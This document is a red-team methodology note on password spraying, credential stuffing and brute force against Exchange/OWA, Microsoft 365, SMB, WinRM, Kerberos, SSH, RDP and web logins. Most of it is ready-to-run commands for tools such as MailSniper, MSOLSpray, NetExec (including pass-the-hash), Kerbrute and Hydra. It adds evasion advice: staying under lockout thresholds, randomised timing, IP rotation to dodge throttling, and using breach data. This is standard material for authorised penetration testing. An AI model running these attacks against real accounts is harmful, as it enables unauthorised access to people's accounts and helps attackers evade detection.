## Password Spraying & Credential Attacks

Using credentials or common password patterns found during recon to gain initial access — spraying, brute force, credential stuffing.

> [!warning] OPSEC
> Always check lockout policies before spraying. One attempt per user per hour is a safe starting point. Too many attempts will lock accounts and generate alerts.

---

### Password Spraying Methodology

Password spraying tries a small number of common passwords against many accounts, staying under lockout thresholds.

#### Common Password Patterns

```
MonthYear       → January2025, February2025
SeasonYear      → Summer2025, Winter2025
CompanyName1!   → Acme2025!
Welcome1        → Welcome1!, Welcome123
Password1       → P@ssw0rd1, Password123!
DayDate         → Tuesday6, Monday1
```

> [!warning]
> Be cautious of localisations — e.g. **Autumn** (UK/AU) vs **Fall** (US). Check the target's region.

#### General Approach

1. Gather usernames from recon phase (LinkedIn, hunter.io, OSINT — see `[[b. Username & Email Harvesting]]`)
2. Generate username permutations if needed (namemash.py, username-anarchy)
3. Validate usernames against target service (timing attacks, enumeration endpoints)
4. Spray with 1-2 common passwords per round, waiting between rounds
5. Monitor for lockouts — abort if any detected

---

### OWA / Exchange Spraying

Full MailSniper workflow for on-prem Exchange OWA portals.

#### MailSniper

https://github.com/dafthack/MailSniper

**1. Import the module**

```powershell
Import-Module C:\Tools\MailSniper\MailSniper.ps1
```

**2. Enumerate the NetBIOS domain name via OWA**

```powershell
Invoke-DomainHarvestOWA -ExchHostname mail.target.com
```

**3. Generate username permutations** (if starting from names, not emails)

```sh
# namemash.py — generates firstname.lastname, f.lastname, flastname, etc.
python3 namemash.py names.txt > possible_usernames.txt
```

> [!info]
> Skip this step if the email format is already known from hunter.io or similar.

**4. Validate usernames via timing attack**

```powershell
Invoke-UsernameHarvestOWA -ExchHostname mail.target.com -Domain target.com -UserList .\possible_usernames.txt -OutFile valid_users.txt
```

**5. Spray valid usernames**

```powershell
Invoke-PasswordSprayOWA -ExchHostname mail.target.com -UserList .\valid_users.txt -Password Summer2025
```

> [!info]
> If new valid usernames are discovered, add them and spray again with different passwords.

#### Ruler

https://github.com/sensepost/ruler

```sh
# Password spray against Exchange
ruler -domain target.com --insecure brute --userpass userpass.txt --delay 5 --verbose
```

---

### M365 / Azure AD Spraying

Brief overview — see `[[e. Cloud Enumeration]]` for detailed cloud-focused spraying.

#### MSOLSpray

https://github.com/dafthack/MSOLSpray

```powershell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Winter2025!" -URL "https://login.microsoft.com"
```

#### Spray365

https://github.com/MarkoH17/Spray365

```sh
# Generate execution plan (avoids detection via randomised timing)
spray365 generate -ep execution_plan.s365 -d target.com -u users.txt -pf passwords.txt

# Execute the spray
spray365 spray -ep execution_plan.s365
```

#### TeamFiltration

https://github.com/Flangvik/TeamFiltration

```sh
# Enumerate and spray in one workflow
TeamFiltration --outpath ./output --enum --spray --sleep-min 120 --sleep-max 300 --passwords passwords.txt
```

> [!info]
> For IP rotation to avoid throttling, pair with **FireProx** (AWS API Gateway proxy). See `[[e. Cloud Enumeration]]`.

---

### NTLM / SMB Spraying

#### NetExec (formerly CrackMapExec)

```sh
# SMB password spray
nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2025!' --continue-on-success

# With a known hash (pass-the-hash)
nxc smb 10.10.10.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash --continue-on-success

# WinRM spray
nxc winrm 10.10.10.0/24 -u users.txt -p 'Summer2025!'

# MSSQL spray
nxc mssql 10.10.10.10 -u users.txt -p passwords.txt
```

#### Hydra (Network Services)

```sh
# SMB
hydra -L users.txt -p 'Summer2025!' smb://10.10.10.10

# RDP
hydra -L users.txt -p 'Summer2025!' rdp://10.10.10.10

# LDAP
hydra -L users.txt -p 'Summer2025!' ldap://10.10.10.10
```

#### Kerbrute

```sh
# Kerberos password spray (fast, doesn't generate normal logon events)
kerbrute passwordspray -d target.local --dc dc01.target.local users.txt 'Summer2025!'

# Username enumeration via Kerberos
kerbrute userenum -d target.local --dc dc01.target.local usernames.txt
```

---

### Credential Stuffing

Using breach data from the recon phase to test credential reuse.

#### Workflow

1. Gather breach data using tools from recon (`[[c. OSINT & External Data]]`)
   - **h8mail** — queries breach databases for known credentials
   - **Dehashed** — paid API for breach lookups
   - **LeakCheck** / **BreachDirectory** — alternative breach sources

2. Build credential list in `user:password` format

3. Test credentials against target services:

```sh
# NetExec with user:pass pairs
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Hydra with colon-separated credential file
hydra -C creds.txt ssh://10.10.10.10
```

> [!warning]
> Credential stuffing has a high lockout risk if users share passwords. Test one credential per account.

---

### Brute Force

Last resort — slow, noisy, high lockout risk. Only viable against services with no lockout policy.

#### Hydra

```sh
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://10.10.10.10

# HTTP POST form
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 4

# RDP brute force (slow — use -t 1 to avoid lockouts)
hydra -L users.txt -P passwords.txt rdp://10.10.10.10 -t 1

# HTTP Basic Auth
hydra -L users.txt -P passwords.txt 10.10.10.10 http-get /admin
```

#### Medusa

```sh
# SSH brute force
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -t 4

# FTP brute force
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ftp
```

#### Patator

```sh
# SSH brute force with detailed output
patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed.'
```
